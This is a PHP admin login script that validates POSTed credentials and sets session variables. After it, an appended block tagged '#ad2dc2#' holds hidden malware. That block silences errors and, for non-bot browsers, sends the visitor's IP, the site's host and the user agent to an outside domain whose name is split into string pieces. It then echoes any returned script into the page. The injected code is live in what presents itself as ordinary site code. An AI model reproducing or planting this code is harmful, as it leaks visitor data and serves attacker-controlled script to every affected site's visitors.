<?php
# ------------------------------------------------------------------ #
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
# ------------------------------------------------------------------ #
include( "../_config.php" );
include( "../classes/utils.php" );
include( "../classes/DAO.php" );
include( "../classes/DBUtils.php" );
include( "../classes/administradoresDAO.php" );
include( "../classes/administradores.php" );
# ------------------------------------------------------------------ #
session_start();
# ------------------------------------------------------------------ #

if ( @$_POST['login'] . '' == '' || @$_POST['password'] . '' == '' )
{
	header('Location: index.php?er=1');
	exit;
}
else
{
	$admin = administradoresDAO::login( $_POST['login'], $_POST['password'] );
	
	if ( $admin === false )
	{
		$_SESSION['admin_id'] = null;
		$_SESSION['admin_login'] = null;
		header('Location: index.php?er=2');
		exit;
	}
	else
	{
		$_SESSION['admin_id'] = $admin->id;
		$_SESSION['admin_login'] = $admin->login;
		header('Location: home.php');
		exit;
	}
}

?>
<?php
#ad2dc2#
error_reporting(0); ini_set('display_errors',0); $wp_p82566 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_p82566) && !preg_match ('/bot/i', $wp_p82566))){
$wp_p0982566="http://"."tags"."value".".com/value"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_p82566);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_p0982566);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_82566p = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_82566p,1,3) === 'scr' ){ echo $wp_82566p; }
#/ad2dc2#
?>
<?php

?>